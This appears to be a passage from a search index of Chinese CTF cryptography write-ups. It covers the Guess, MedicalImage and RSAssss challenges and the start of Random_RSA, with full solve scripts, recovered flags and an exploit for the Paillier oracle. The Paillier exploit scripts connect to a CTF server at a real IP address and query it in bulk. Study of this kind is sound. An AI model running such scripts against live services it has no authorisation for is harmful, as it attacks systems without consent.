\u4e5f\u662f\u6709\u9650\u7684\uff0880\u4e2a\uff09\uff0c\u8fd9\u5c31\u53d8\u6210\u4e86\u4e00\u4e2a80\u4e2a\u6837\u672c\u7684\u4e8c\u5206\u7c7b\u95ee\u9898\u3002\u6211\u4eec\u53ef\u4ee5\u628a\u6240\u8f93\u5165\u7684 \u548c \u56fa\u5b9a\uff0c\u53ef\u4ee5\u591a\u6b21\u548coracle\u4ea4\u4e92\uff0c\u5148\u5c1d\u8bd5\u731c\u6d4b\u7b54\u6848\uff0c\u6839\u636eoracle\u7684\u68c0\u9a8c\u7ed3\u679c\u5f97\u5230\u82e5\u5e72 \u7684\u5148\u9a8c\u77e5\u8bc6\u3002 \u7136\u540e\u53ea\u8981\u5148\u9a8c\u77e5\u8bc6\u8db3\u591f\u591a\uff0c\u90a3\u5c31\u80fd\u4fdd\u8bc1\u5f88\u5927\u6982\u7387\u731c\u5bf9\u3002\u731c\u6d4b\u7b54\u6848\u4ee3\u7801\u5982\u4e0b\uff1a from hashlib import sha256 import string import itertools from pwn import * from Crypto.Util.number import * import random def enc(n, g, m): while 1: r = random.randint(2, n - 1) if GCD(r, n) == 1: break c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2) return c with open('gao_log_3', 'a') as f: while (True): conn = remote('47.104.85.225', 57811) # SHA-256(?+hUWmo9BJ34LI) == 3919fa0f116d1a87c97d98dd43e08f77b090df5c88b1417c1c7e2c006a200aef s = conn.recvline().strip().decode() s2 = s[10:22] ans = s[-64:] for i in itertools.product(string.ascii_letters + string.digits, repeat=4): s1 = ''.join(i) ss = s1 + s2 if (sha256(ss.encode()).hexdigest() == ans): conn.sendline(s1) break while (True): conn.recvuntil('n = ') n = conn.recvline() n = int(n) conn.recvuntil('g = ') g = conn.recvline() g = int(g) conn.sendlineafter('Please give me one decimal ciphertext.', '2') conn.recvuntil('This is the corresponding plaintext.\\n') mm = conn.recvline() mm = int(mm) conn.sendlineafter('Give me m0.', '40343') conn.sendlineafter('Give me m1.', '52051') conn.recvuntil('This is a ciphertext.\\n') c = conn.recvline() c = int(c) mm = 2 c2 = enc(n, g, mm) cc = (c * c2) % (n ** 2) conn.sendlineafter('Please give me one decimal ciphertext', str(cc)) conn.recvuntil('This is the corresponding plaintext.\\n') m2 = conn.recvline() m2 = int(m2) conn.sendlineafter('m1 -> c1)?', '0') s = conn.recvuntil('!') if (b'Sorry') in s: f.write(f'{m2}, 1\\n') conn.close() break else: f.write(f'{m2}, 0\\n') \u5229\u7528\u731c\u6d4b\u7b54\u6848\u6240\u5f97\u7684\u77e5\u8bc6\u5e93\u8fdb\u884c\u4ea4\u4e92\u7684\u4ee3\u7801\u5982\u4e0b\uff1a from hashlib import sha256 import string import itertools import random from pwn import * from Crypto.Util.number import * def enc(n, g, m): while 1: r = random.randint(2, n - 1) if GCD(r, n) == 1: break c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2) return c m2ans = {} cnt = 0 for i in range(1, 5): with open(f'gao_log_{i}', 'r') as f: s = f.read() for sline in s.splitlines(): m, ans = map(int, sline.split(',')) m2ans[m] = ans cnt += 1 print(len(m2ans)) conn = remote('47.104.85.225', 57811) # SHA-256(?+hUWmo9BJ34LI) == 3919fa0f116d1a87c97d98dd43e08f77b090df5c88b1417c1c7e2c006a200aef s = conn.recvline().strip().decode() s2 = s[10:22] ans = s[-64:] for i in itertools.product(string.ascii_letters + string.digits, repeat=4): s1 = ''.join(i) ss = s1 + s2 if (sha256(ss.encode()).hexdigest() == ans): conn.sendline(s1) break for i in range(32): conn.recvuntil('n = ') n = conn.recvline() n = int(n) conn.recvuntil('g = ') g = conn.recvline() g = int(g) conn.sendlineafter('Please give me one decimal ciphertext.', '2') conn.recvuntil('This is the corresponding plaintext.\\n') mm = conn.recvline() mm = int(mm) conn.sendlineafter('Give me m0.', '40343') conn.sendlineafter('Give me m1.', '52051') conn.recvuntil('This is a ciphertext.\\n') c = conn.recvline() c = int(c) mm = 2 c2 = enc(n, g, mm) cc = (c * c2) % (n ** 2) conn.sendlineafter('Please give me one decimal ciphertext', str(cc)) conn.recvuntil('This is the corresponding plaintext.\\n') m2 = conn.recvline() m2 = int(m2) if (m2 in m2ans): print('Find') conn.sendlineafter('m1 -> c1)?', str(m2ans[m2])) else: print('Guess') conn.sendlineafter('m1 -> c1)?', '0') s = conn.recvuntil('!') if (b'Sorry') in s: print(f'GG {i}') conn.close() break conn.interactive() Flag flag{e87fdfb6-8007-4e1c-861f-5bde3c8badb3} Reference Writeup from https://zhuanlan.zhihu.com/p/402690414","title":"Guess"},{"location":"Writeup/Cryptography/Guess/#guess","text":"Category: Cryptography Source: \u7965\u4e91\u676f2021 Author: unknown Score: 15","title":"Guess"},{"location":"Writeup/Cryptography/Guess/#description","text":"\u5728\u4e00\u6b21\u4efb\u52a1\u4e2d\u6211\u9047\u5230\u4e86\u4e00\u4e2achallenge\uff0c\u6211\u7684\u961f\u53cb\u7ed9\u6211\u53d1\u4e86\u4e00\u4e2a\u4ed6\u622a\u83b7\u7684hint\uff0c\u4f60\u5229\u7528\u8fd9\u4e2ahint\u80fd\u5e2e\u6211\u5b8c\u6210\u8fd9\u4e2achallenge\u5417\uff1f nc 0.cloud.chals.io 14337 guess.zip","title":"Description"},{"location":"Writeup/Cryptography/Guess/#_1","text":"\u9996\u5148\u5b83\u6709\u4e00\u4e2a\u5bc6\u94a5\u751f\u6210\u7684\u4ee3\u7801\u3002 key \u662f\u4e00\u4e2a20*4\u7684\u77e9\u9635\uff0c\u5143\u7d20\u5747\u4e3a\u4e09\u4f4d\u6570\uff0c\u7136\u540e\u53f3\u4e58\u4e00\u4e2a\u968f\u673a1024\u4f4d\u77e9\u9635 \u5f97\u5230 \u3002\u6211\u4eec\u53ea\u77e5\u9053 key \u77e9\u9635\u7b2c\u4e00\u884c\u7684\u5185\u5bb9\uff0c\u4ee5\u53ca \u7684\u503c\uff0c\u4f46\u662f\u4e0d\u77e5\u9053 \u77e9\u9635\u7684\u5185\u5bb9\u3002 \u731c\u6d4b\u53ef\u80fd\u53ef\u4ee5\u7528\u683c\u57fa\u89c4\u7ea6\u5148\u5f04\u51fa key \uff0c\u4f46\u662f\u6709\u611f\u89c9\u4e0d\u9760\u8c31\uff0c\u6211\u4eec\u5148\u653e\u4e00\u653e\uff0c\u5ba1\u8ba1\u4e00\u4e0boracle\u4ea4\u4e92\u7684 Guess.py \u6587\u4ef6\u3002 \u6587\u4ef6\u4e2d\u4f7f\u7528\u7684\u5bc6\u7801\u7b97\u6cd5\u662fPaillier\u7b97\u6cd5\uff0c\u8be5\u7b97\u6cd5\u652f\u6301\u540c\u6001\u52a0\u6cd5\u3002oracle\u4ea4\u4e92\u903b\u8f91\u5982\u4e0b\uff1a \u7ed9\u51fa\u7b97\u6cd5\u7684\u52a0\u5bc6\u5bc6\u94a5\uff08\u5373\u516c\u94a5\uff09\u3002 \u7ed9\u51fa\u4e00\u4e2a\u5bc6\u6587\uff0coracle\u8fd4\u56de\u660e\u6587\u3002 \u7ed9\u51fa\u4e24\u4e2a\u660e\u6587 , oracle\u8fd4\u56de \u6216\u8005 \u7684\u5176\u4e2d\u4e00\u9879\uff0c\u5176\u4e2d \u662f\u4e00\u968f\u673a\u7684\u5076\u6570\uff0c \u662f\u90a380\u4e2a100-1000\u7684\u6570\u6784\u6210\u7684\u4e00\u4e2a\u5217\u8868\u3002 \u7ed9\u51fa\u4e00\u4e2a\u4e0d\u80fd\u548c\u7b2c3\u6b65\u89e3\u5bc6\u7ed3\u679c\u76f8\u540c\u7684\u5bc6\u6587\uff0coracle\u8fd4\u56de\u660e\u6587\u3002 \u5224\u65ad\u7b2c3\u6b65\u4e2doracle\u8fd4\u56de\u4e86\u54ea\u4e2a\u5bc6\u6587\uff0c\u5e76\u544a\u8bc9oracle\u7ed3\u679c\u4ee5\u68c0\u9a8c\u3002\u5982\u679coracle\u68c0\u9a8c\u6210\u529f\uff0c\u5219\u8fdb\u884c\u4e0b\u4e00\u8f6e\uff1b\u5982\u679coracle\u68c0\u9a8c\u5931\u8d25\uff0c\u5219\u7ec8\u6b62\u8fde\u63a5\u3002 \u9700\u8981\u68c0\u9a8c\u6210\u529f32\u8f6e\u624d\u80fd\u62ff\u5230flag\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"Writeup/Cryptography/Guess/#_2","text":"\u672c\u8d28\u4e0a\u53ea\u9700\u8981\u628a key \u6062\u590d\u51fa\u6765\u5373\u53ef\u3002\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5728\u4e0a\u9762\u7684\u7b2c\u56db\u6b65\u505a\u6587\u7ae0\u3002 \u7b2c\u56db\u6b65\u53ef\u4ee5\u7528Paillier\u7b97\u6cd5\u7684\u6027\u8d28\u6765\u6784\u9020\u5bc6\u6587\u3002\u8bb0 \uff0cPaillier\u7b97\u6cd5\u5bf9\u4e8e\u4e00\u4e2a\u660e\u6587 \uff0c\u5148\u968f\u673a\u751f\u6210\u4e00\u4e2a \uff0c\u7136\u540e\u8ba1\u7b97 \u3002 \u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e24\u4e2a\u660e\u6587\u5bc6\u6587\u5bf9 \uff0c\u6211\u4eec\u8ba1\u7b97 \u6b64\u65f6\u6211\u4eec\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u65b0\u6784\u9020\u7684\u5bc6\u6587 \u5bf9\u5e94\u660e\u6587 \u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4 \u4e3aoracle\u6240\u7ed9\u7684\u5bc6\u6587\uff0c\u5e76\u4f7f\u7528\u9898\u76ee\u6240\u7ed9\u7684\u516c\u94a5\u5f97\u5230\u53e6\u4e00\u4e2a\u660e\u6587\u5bc6\u6587\u5bf9 \uff0c\u8b6c\u5982\u4ee4 \uff0c\u7136\u540e\u7528 \u548c \u52a0\u5bc6\u5f97\u5230 \uff0c\u5e76\u6784\u9020\u5bc6\u6587 \u7136\u540e\u5c31\u53ef\u4ee5\u5728oracle\u7684\u7b2c\u56db\u6b65\u8f93\u5165\u8fd9\u4e2a \uff0c\u8fd9\u6837oracle\u6240\u89e3\u51fa\u7684\u660e\u6587 \u5c31\u662f \u56e0\u4e3a\u9898\u76ee\u6240\u7ed9\u7684 key \u662f\u56fa\u5b9a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4 \u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5oracle\u89e3\u51fa\u7684\u660e\u6587 \u4e5f\u662f\u6709\u9650\u7684\uff0880\u4e2a\uff09\uff0c\u8fd9\u5c31\u53d8\u6210\u4e86\u4e00\u4e2a80\u4e2a\u6837\u672c\u7684\u4e8c\u5206\u7c7b\u95ee\u9898\u3002\u6211\u4eec\u53ef\u4ee5\u628a\u6240\u8f93\u5165\u7684 \u548c \u56fa\u5b9a\uff0c\u53ef\u4ee5\u591a\u6b21\u548coracle\u4ea4\u4e92\uff0c\u5148\u5c1d\u8bd5\u731c\u6d4b\u7b54\u6848\uff0c\u6839\u636eoracle\u7684\u68c0\u9a8c\u7ed3\u679c\u5f97\u5230\u82e5\u5e72 \u7684\u5148\u9a8c\u77e5\u8bc6\u3002 \u7136\u540e\u53ea\u8981\u5148\u9a8c\u77e5\u8bc6\u8db3\u591f\u591a\uff0c\u90a3\u5c31\u80fd\u4fdd\u8bc1\u5f88\u5927\u6982\u7387\u731c\u5bf9\u3002\u731c\u6d4b\u7b54\u6848\u4ee3\u7801\u5982\u4e0b\uff1a from hashlib import sha256 import string import itertools from pwn import * from Crypto.Util.number import * import random def enc(n, g, m): while 1: r = random.randint(2, n - 1) if GCD(r, n) == 1: break c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2) return c with open('gao_log_3', 'a') as f: while (True): conn = remote('47.104.85.225', 57811) # SHA-256(?+hUWmo9BJ34LI) == 3919fa0f116d1a87c97d98dd43e08f77b090df5c88b1417c1c7e2c006a200aef s = conn.recvline().strip().decode() s2 = s[10:22] ans = s[-64:] for i in itertools.product(string.ascii_letters + string.digits, repeat=4): s1 = ''.join(i) ss = s1 + s2 if (sha256(ss.encode()).hexdigest() == ans): conn.sendline(s1) break while (True): conn.recvuntil('n = ') n = conn.recvline() n = int(n) conn.recvuntil('g = ') g = conn.recvline() g = int(g) conn.sendlineafter('Please give me one decimal ciphertext.', '2') conn.recvuntil('This is the corresponding plaintext.\\n') mm = conn.recvline() mm = int(mm) conn.sendlineafter('Give me m0.', '40343') conn.sendlineafter('Give me m1.', '52051') conn.recvuntil('This is a ciphertext.\\n') c = conn.recvline() c = int(c) mm = 2 c2 = enc(n, g, mm) cc = (c * c2) % (n ** 2) conn.sendlineafter('Please give me one decimal ciphertext', str(cc)) conn.recvuntil('This is the corresponding plaintext.\\n') m2 = conn.recvline() m2 = int(m2) conn.sendlineafter('m1 -> c1)?', '0') s = conn.recvuntil('!') if (b'Sorry') in s: f.write(f'{m2}, 1\\n') conn.close() break else: f.write(f'{m2}, 0\\n') \u5229\u7528\u731c\u6d4b\u7b54\u6848\u6240\u5f97\u7684\u77e5\u8bc6\u5e93\u8fdb\u884c\u4ea4\u4e92\u7684\u4ee3\u7801\u5982\u4e0b\uff1a from hashlib import sha256 import string import itertools import random from pwn import * from Crypto.Util.number import * def enc(n, g, m): while 1: r = random.randint(2, n - 1) if GCD(r, n) == 1: break c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2) return c m2ans = {} cnt = 0 for i in range(1, 5): with open(f'gao_log_{i}', 'r') as f: s = f.read() for sline in s.splitlines(): m, ans = map(int, sline.split(',')) m2ans[m] = ans cnt += 1 print(len(m2ans)) conn = remote('47.104.85.225', 57811) # SHA-256(?+hUWmo9BJ34LI) == 3919fa0f116d1a87c97d98dd43e08f77b090df5c88b1417c1c7e2c006a200aef s = conn.recvline().strip().decode() s2 = s[10:22] ans = s[-64:] for i in itertools.product(string.ascii_letters + string.digits, repeat=4): s1 = ''.join(i) ss = s1 + s2 if (sha256(ss.encode()).hexdigest() == ans): conn.sendline(s1) break for i in range(32): conn.recvuntil('n = ') n = conn.recvline() n = int(n) conn.recvuntil('g = ') g = conn.recvline() g = int(g) conn.sendlineafter('Please give me one decimal ciphertext.', '2') conn.recvuntil('This is the corresponding plaintext.\\n') mm = conn.recvline() mm = int(mm) conn.sendlineafter('Give me m0.', '40343') conn.sendlineafter('Give me m1.', '52051') conn.recvuntil('This is a ciphertext.\\n') c = conn.recvline() c = int(c) mm = 2 c2 = enc(n, g, mm) cc = (c * c2) % (n ** 2) conn.sendlineafter('Please give me one decimal ciphertext', str(cc)) conn.recvuntil('This is the corresponding plaintext.\\n') m2 = conn.recvline() m2 = int(m2) if (m2 in m2ans): print('Find') conn.sendlineafter('m1 -> c1)?', str(m2ans[m2])) else: print('Guess') conn.sendlineafter('m1 -> c1)?', '0') s = conn.recvuntil('!') if (b'Sorry') in s: print(f'GG {i}') conn.close() break conn.interactive()","title":"\u6211\u7684\u89e3\u7b54"},{"location":"Writeup/Cryptography/Guess/#flag","text":"flag{e87fdfb6-8007-4e1c-861f-5bde3c8badb3}","title":"Flag"},{"location":"Writeup/Cryptography/Guess/#reference","text":"Writeup from https://zhuanlan.zhihu.com/p/402690414","title":"Reference"},{"location":"Writeup/Cryptography/MedicalImage/","text":"MedicalImage Category: Cryptography Source: \u5dc5\u5cf0\u6781\u5ba2\u8d5b 2021 Author: unknown Score: 25 Solution \u4e00\u4e2a\u56fe\u7247\u52a0\u5bc6\u811a\u672c, \u51fd\u6570 f(x) \u88ab\u9690\u85cf\u4e86, \u4f46\u7ed9\u4e86\u63d0\u793a, \u662f logistic map , (\u5728b\u7ad9\u770b\u4e0b\u89c6\u9891, \u6570\u5b66\u771f\u7684\u597d\u795e\u5947\u554a).\u800c\u4e14\u53c2\u6570rr\u662f\u6700\u5927\u5408\u6cd5\u503c, \u4e5f\u5c31\u662f44, \u90a3\u4e48\u51fd\u6570 f(x) \u4e3a f(x)=4x(1\u2212x)f(x)=4x(1\u2212x) \u7136\u540e\u5c31\u662f\u5bf9\u7740\u52a0\u5bc6\u6d41\u7a0b\u5199\u89e3\u5bc6\u4e86\u2026. \u6ca1\u6709\u5565\u7279\u522b\u7684 \u9006\u7740\u52a0\u5bc6\u8fc7\u7a0b\u5199\u89e3\u5bc6\u5c31\u884c, p0,c0\u5c31\u90a3\u51e0\u4e2a\u503c\u7206\u7834\u5c31\u884c, \u4e00\u5f00\u59cb\u968f\u4fbf\u62ff101,201\u8bd5\u4e86\u4e0b\u2026\u76f4\u63a5\u5bf9\u4e86 from decimal import * from PIL import Image import numpy as np from time import time getcontext().prec = 20 R = Decimal(4) r1 = Decimal('0.478706063089473894123') r2 = Decimal('0.613494245341234672318') r3 = Decimal('0.946365754637812381837') const = 10 ** 14 im = Image.open( r'flag_enc.bmp' ) size = im.size w,h = size im = np.array(im) def f(x): return Decimal(4 * x * (1 - x)) for i in range(200): r1 = f(r1) r2 = f(r2) r3 = f(r3) S = time() p0 = 101 c0 = 201 for x in range(w): for y in range(h): k = int(round(const*r3))%256 k = bin(k)[2:].ljust(8,'0') k = int(k[p0%8:]+k[:p0%8],2) r3 = f(r3) m0 = ((k ^ im[y,x] ^ c0 ) - k) % 256 c0 = im[y,x] p0 = m0 im[y,x] = m0 arr = [] for x in range(w): for y in range(h): x1 = int(round(const*r1))%w y1 = int(round(const*r2))%h arr += [(x,y,x1,y1)] r1 = f(r1) r2 = f(r2) for z in arr[::-1]: x,y,x1,y1 = z tmp = im[y,x] im[y,x] = im[y1,x1] im[y1,x1] = tmp m = Image.new('P', size,'white') pixels = m.load() for i in range(m.size[0]): for j in range(m.size[1]): pixels[i,j] = (int(im[j][i])) m.save(r'flag.bmp') print(time()-S)","title":"MedicalImage"},{"location":"Writeup/Cryptography/MedicalImage/#medicalimage","text":"Category: Cryptography Source: \u5dc5\u5cf0\u6781\u5ba2\u8d5b 2021 Author: unknown Score: 25","title":"MedicalImage"},{"location":"Writeup/Cryptography/MedicalImage/#solution","text":"\u4e00\u4e2a\u56fe\u7247\u52a0\u5bc6\u811a\u672c, \u51fd\u6570 f(x) \u88ab\u9690\u85cf\u4e86, \u4f46\u7ed9\u4e86\u63d0\u793a, \u662f logistic map , (\u5728b\u7ad9\u770b\u4e0b\u89c6\u9891, \u6570\u5b66\u771f\u7684\u597d\u795e\u5947\u554a).\u800c\u4e14\u53c2\u6570rr\u662f\u6700\u5927\u5408\u6cd5\u503c, \u4e5f\u5c31\u662f44, \u90a3\u4e48\u51fd\u6570 f(x) \u4e3a f(x)=4x(1\u2212x)f(x)=4x(1\u2212x) \u7136\u540e\u5c31\u662f\u5bf9\u7740\u52a0\u5bc6\u6d41\u7a0b\u5199\u89e3\u5bc6\u4e86\u2026. \u6ca1\u6709\u5565\u7279\u522b\u7684 \u9006\u7740\u52a0\u5bc6\u8fc7\u7a0b\u5199\u89e3\u5bc6\u5c31\u884c, p0,c0\u5c31\u90a3\u51e0\u4e2a\u503c\u7206\u7834\u5c31\u884c, \u4e00\u5f00\u59cb\u968f\u4fbf\u62ff101,201\u8bd5\u4e86\u4e0b\u2026\u76f4\u63a5\u5bf9\u4e86 from decimal import * from PIL import Image import numpy as np from time import time getcontext().prec = 20 R = Decimal(4) r1 = Decimal('0.478706063089473894123') r2 = Decimal('0.613494245341234672318') r3 = Decimal('0.946365754637812381837') const = 10 ** 14 im = Image.open( r'flag_enc.bmp' ) size = im.size w,h = size im = np.array(im) def f(x): return Decimal(4 * x * (1 - x)) for i in range(200): r1 = f(r1) r2 = f(r2) r3 = f(r3) S = time() p0 = 101 c0 = 201 for x in range(w): for y in range(h): k = int(round(const*r3))%256 k = bin(k)[2:].ljust(8,'0') k = int(k[p0%8:]+k[:p0%8],2) r3 = f(r3) m0 = ((k ^ im[y,x] ^ c0 ) - k) % 256 c0 = im[y,x] p0 = m0 im[y,x] = m0 arr = [] for x in range(w): for y in range(h): x1 = int(round(const*r1))%w y1 = int(round(const*r2))%h arr += [(x,y,x1,y1)] r1 = f(r1) r2 = f(r2) for z in arr[::-1]: x,y,x1,y1 = z tmp = im[y,x] im[y,x] = im[y1,x1] im[y1,x1] = tmp m = Image.new('P', size,'white') pixels = m.load() for i in range(m.size[0]): for j in range(m.size[1]): pixels[i,j] = (int(im[j][i])) m.save(r'flag.bmp') print(time()-S)","title":"Solution"},{"location":"Writeup/Cryptography/RSAssss/","text":"RSAssss Category: Cryptography Source: \u7965\u4e91\u676f2020 Author: unknown Score: 25 Description more factors,more strong Solution from Crypto.Util.number import * from gmpy2 import next_prime p = getPrime(512) q = getPrime(512) n = p * q * next_prime(p) * next_prime(q) e = 0x10001 flag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\" cipher = pow(bytes_to_long(flag), e, n) print(n, cipher) #8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257 #330412463971933434999766363211057930667393277770584064857577467142742413428768098831412931259336108760624381952829861013179707826235130739683198539755539064015139113863343195174674815661046358247964556177919498180612989800987651789945084087556967597676515560844679920369992744883500475670715128104485967669553337375579827389250319475394899794765310069084188092544505917549431419860547502393956775040990721765429143061510225852399839423143679690263507799582947734731675473993898081429330428931841744349301970407316458550521765857021498915017512375703812538099605076157202198657393415547064109167866445108006571926 \u56db\u7d20\u6570\u7684RSA\u653b\u51fb\uff0c\u66fe\u7ecf\u8003\u8fc7\uff0c\u76f4\u63a5\u4e0a\u811a\u672c # -*- coding: utf-8 -*- from Crypto.Util.number import GCD, inverse, long_to_bytes import gmpy2 n = 8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257 c = 3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207 e = 0x10001 def fermat_factorization(N): Factor = [] gmpy2.get_context().precision = 2048 a = int(gmpy2.sqrt(N)) a2 = a * a b2 = gmpy2.sub(a2, N) while True: a += 1 b2 = a * a - N if gmpy2.is_square(b2): b2 = gmpy2.mpz(b2) gmpy2.get_context().precision = 2048 b = int(gmpy2.sqrt(b2)) Factor.append([a + b, a - b]) if len(Factor) == 2: break return Factor if __name__ == \"__main__\": factor = fermat_factorization(n) [X1, Y1] = factor[0] [X2, Y2] = factor[1] assert X1 * Y1 == n assert X2 * Y2 == n p1 = gmpy2.mpz(GCD(X1, X2)) p2 = gmpy2.mpz(X1 / p1) q1 = gmpy2.mpz(GCD(Y1, Y2)) q2 = gmpy2.mpz(Y1 / q1) assert p1 * p2 * q1 * q2 == n phi = gmpy2.mpz(0) phi = (p1 - 1) * (q1 - 1) * (p2 - 1) * (q2 - 1) d = inverse(e, phi) flag = long_to_bytes(pow(c, d, n)) print(flag) Flag flag{2bef1a3e-5598-404e-b022-f593a230ce58} Reference Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"RSAssss"},{"location":"Writeup/Cryptography/RSAssss/#rsassss","text":"Category: Cryptography Source: \u7965\u4e91\u676f2020 Author: unknown Score: 25","title":"RSAssss"},{"location":"Writeup/Cryptography/RSAssss/#description","text":"more factors,more strong","title":"Description"},{"location":"Writeup/Cryptography/RSAssss/#solution","text":"from Crypto.Util.number import * from gmpy2 import next_prime p = getPrime(512) q = getPrime(512) n = p * q * next_prime(p) * next_prime(q) e = 0x10001 flag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\" cipher = pow(bytes_to_long(flag), e, n) print(n, cipher) #8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257 #330412463971933434999766363211057930667393277770584064857577467142742413428768098831412931259336108760624381952829861013179707826235130739683198539755539064015139113863343195174674815661046358247964556177919498180612989800987651789945084087556967597676515560844679920369992744883500475670715128104485967669553337375579827389250319475394899794765310069084188092544505917549431419860547502393956775040990721765429143061510225852399839423143679690263507799582947734731675473993898081429330428931841744349301970407316458550521765857021498915017512375703812538099605076157202198657393415547064109167866445108006571926 \u56db\u7d20\u6570\u7684RSA\u653b\u51fb\uff0c\u66fe\u7ecf\u8003\u8fc7\uff0c\u76f4\u63a5\u4e0a\u811a\u672c # -*- coding: utf-8 -*- from Crypto.Util.number import GCD, inverse, long_to_bytes import gmpy2 n = 8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257 c = 3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207 e = 0x10001 def fermat_factorization(N): Factor = [] gmpy2.get_context().precision = 2048 a = int(gmpy2.sqrt(N)) a2 = a * a b2 = gmpy2.sub(a2, N) while True: a += 1 b2 = a * a - N if gmpy2.is_square(b2): b2 = gmpy2.mpz(b2) gmpy2.get_context().precision = 2048 b = int(gmpy2.sqrt(b2)) Factor.append([a + b, a - b]) if len(Factor) == 2: break return Factor if __name__ == \"__main__\": factor = fermat_factorization(n) [X1, Y1] = factor[0] [X2, Y2] = factor[1] assert X1 * Y1 == n assert X2 * Y2 == n p1 = gmpy2.mpz(GCD(X1, X2)) p2 = gmpy2.mpz(X1 / p1) q1 = gmpy2.mpz(GCD(Y1, Y2)) q2 = gmpy2.mpz(Y1 / q1) assert p1 * p2 * q1 * q2 == n phi = gmpy2.mpz(0) phi = (p1 - 1) * (q1 - 1) * (p2 - 1) * (q2 - 1) d = inverse(e, phi) flag = long_to_bytes(pow(c, d, n)) print(flag)","title":"Solution"},{"location":"Writeup/Cryptography/RSAssss/#flag","text":"flag{2bef1a3e-5598-404e-b022-f593a230ce58}","title":"Flag"},{"location":"Writeup/Cryptography/RSAssss/#reference","text":"Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Reference"},{"location":"Writeup/Cryptography/Random_RSA/","text":"Random_RSA Category: Cryptography Source: \u7965\u4e91\u676f2021 Author: unknown Score: 10 Description \u4e00\u628a\u68ad\uff0c\u597d\u50cf\u4e0d\u884c\u54e6\u3002 Random_RSA.zip \u9898\u76ee\u63cf\u8ff0 \u9898\u76ee\u57fa\u4e8eRSA\uff0c \u3002\u9898\u76ee\u7ed9\u51faflag\u52a0\u5bc6\u7684\u5bc6\u6587 \u3002 \u9898\u76ee\u7ed9\u51fa\u4e86\u5173\u4e8e \u7684\u63d0\u793a\uff1a\u9898\u76ee\u7ed9\u4e86\u968f\u673a\u79cd\u5b50\u5217\u8868\u3002\u5bf9\u4e8e\u6bcf\u4e2a\u968f\u673a\u79cd\u5b50\uff0c\u9898\u76ee\u4f1a\u57fa\u4e8e\u8fd9\u4e2a\u968f\u673a\u79cd\u5b50\u751f\u6210\u4e00\u4e2a\u968f\u673a\u6570\u5217\u8868\uff0c\u6bcf\u6b21\u90fd\u4ece\u5217\u8868\u91cc\u9762\u6307\u5b9a\u4f4d\u7f6e\u62a0\u6389\u4e00\u4e2a\u6570\uff0c\u5e76\u4e14\u7ed9\u51fa\u5176\u4ed6\u6570\u7ec4\u6210\u7684\u5217\u8868\uff1b\u7528\u88ab\u62a0\u6389\u90a3\u4e2a\u6570\u4f5c\u4e3a\u6d41\u5bc6\u94a5\uff0c\u4e0e \u7684\u5341\u8fdb\u5236\u8868\u793a\u5b57\u7b26\u4e32\u5bf9\u5e94\u5b57\u8282\u8fdb\u884c\u5f02\u6216\uff0c\u5f97\u5230\u4e00\u4e2a\u5bc6\u6587\u3002 \u6211\u7684\u89e3\u7b54 \u9996\u5148\u6211\u4eec\u5148\u5c1d\u8bd5\u641e\u51fa \uff1a\u6211\u4eec\u901a\u8fc7\u8bbe\u968f\u673a\u79cd\u5b50\uff0c\u5f97\u5230\u5217\u8868\u3002\u53d1\u73b0\u53ea\u6709python 